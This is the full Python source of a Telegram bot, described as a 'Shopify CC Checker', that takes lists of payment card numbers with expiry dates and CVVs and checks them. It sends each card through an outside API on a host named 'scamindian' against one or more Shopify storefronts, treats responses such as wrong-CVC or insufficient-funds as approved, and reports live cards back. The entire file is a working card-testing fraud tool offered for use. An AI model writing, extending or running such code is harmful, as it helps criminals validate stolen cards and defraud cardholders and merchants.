import requests
import json
import time
import os
import re
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# ============= CONFIG =============
BASE_URL = "https://scamindian-production.up.railway.app/shopify"
DEFAULT_SITE = "https://greatergoods-com.myshopify.com"

APPROVED_RESPONSES = [
    "ORDER_PLACED", "OTP_REQUIRED", "INCORRECT_CVC", "INCORRECT_CVV",
    "INSUFFICIENT_FUNDS", "INCORRECT_ZIP", "INCORRECT_POSTAL_CODE"
]

TOKEN = os.getenv("TOKEN")   # ← VERY IMPORTANT

# =================================

def parse_card_line(line: str):
    """Smart parser for messy card lines"""
    line = line.strip()
    if not line:
        return None
    
    parts = [p.strip() for p in line.split('|')]
    
    if len(parts) >= 4:
        cc = re.sub(r'\D', '', parts[0])
        mm = re.sub(r'\D', '', parts[1])
        yyyy = re.sub(r'\D', '', parts[2])
        cvv = re.sub(r'\D', '', parts[3])
        
        if len(cc) >= 13 and len(mm) == 2 and len(yyyy) >= 4 and len(cvv) >= 3:
            return f"{cc}|{mm}|{yyyy}|{cvv}"
    return None


def consultar_api(sitio: str, cc_data: str):
    if not sitio.startswith('http'):
        sitio = 'https://' + sitio
    params = {'site': sitio, 'cc': cc_data}
    try:
        r = requests.get(BASE_URL, params=params, timeout=30)
        return r.text if r.status_code == 200 else f"HTTP Error {r.status_code}"
    except Exception as e:
        return f"Connection Error: {str(e)}"


def procesar_respuesta(respuesta):
    try:
        data = json.loads(respuesta) if isinstance(respuesta, str) and respuesta.startswith('{') else {"Response": respuesta}
        resp_type = data.get('Response', '')
        if resp_type in APPROVED_RESPONSES or data.get('Status') == True:
            return "✅ APPROVED", resp_type or "Success"
        return "❌ DECLINED", resp_type or "Declined"
    except:
        return "❌ ERROR", "Parse Error"


# ================== BOT HANDLERS ==================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>🛍️ Shopify CC Checker Bot</b>\n\n"
        "Send cards or upload .txt file.\n"
        "I will auto-parse CC|MM|YYYY|CVV\n\n"
        "Commands: /help /status /setsite /setsites",
        parse_mode=ParseMode.HTML
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>Commands:</b>\n"
        "/setsite &lt;url&gt; → Set single site\n"
        "/setsites → Upload sites.txt\n"
        "/status → Current settings\n\n"
        "Just send cards or upload card file!", 
        parse_mode=ParseMode.HTML
    )


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    site = context.user_data.get('site', DEFAULT_SITE)
    sites_count = len(context.user_data.get('sites', []))
    await update.message.reply_text(f"Active Site: {site}\nMultiple Sites: {sites_count}", parse_mode=ParseMode.HTML)


async def set_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /setsite https://example.myshopify.com")
        return
    site = "https://" + context.args[0] if not context.args[0].startswith("http") else context.args[0]
    context.user_data['site'] = site
    context.user_data.pop('sites', None)
    await update.message.reply_text(f"✅ Site set: <code>{site}</code>", parse_mode=ParseMode.HTML)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Only .txt files supported!")
        return

    file = await document.get_file()
    file_path = f"temp_{update.message.message_id}.txt"
    await file.download_to_drive(file_path)

    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]

    os.remove(file_path)

    if any("myshopify.com" in line for line in lines[:15]):
        context.user_data['sites'] = lines
        await update.message.reply_text(f"✅ Loaded {len(lines)} sites.")
    else:
        await process_cards(update, context, lines)


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lines = [line.strip() for line in update.message.text.splitlines() if line.strip()]
    await process_cards(update, context, lines)


async def process_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, raw_lines):
    cards = [parse_card_line(line) for line in raw_lines if parse_card_line(line)]
    if not cards:
        await update.message.reply_text("❌ No valid cards found.")
        return

    await update.message.reply_text(f"🔄 Checking {len(cards)} cards...")

    sites = context.user_data.get('sites')
    single_site = context.user_data.get('site', DEFAULT_SITE)
    approved = 0

    for cc in cards:
        if sites:
            for site in sites[:6]:   # Limit to avoid overload
                resp = consultar_api(site, cc)
                status, reason = procesar_respuesta(resp)
                if "APPROVED" in status:
                    approved += 1
                    await update.message.reply_text(f"✅ <b>APPROVED</b> → {site}\n<code>{cc}</code>", parse_mode=ParseMode.HTML)
                    break
        else:
            resp = consultar_api(single_site, cc)
            status, reason = procesar_respuesta(resp)
            if "APPROVED" in status:
                approved += 1
            await update.message.reply_text(f"{status} | {cc}\nReason: {reason}")

        time.sleep(0.8)

    await update.message.reply_text(f"<b>✅ Done!</b>\nApproved: {approved}/{len(cards)}", parse_mode=ParseMode.HTML)


def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("setsite", set_site))
    app.add_handler(CommandHandler("setsites", lambda u,c: u.message.reply_text("Upload sites.txt file")))

    app.add_handler(MessageHandler(filters.Document.TEXT, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("🚀 Shopify CC Bot is Running...")
    app.run_polling()


if __name__ == "__main__":
    main()
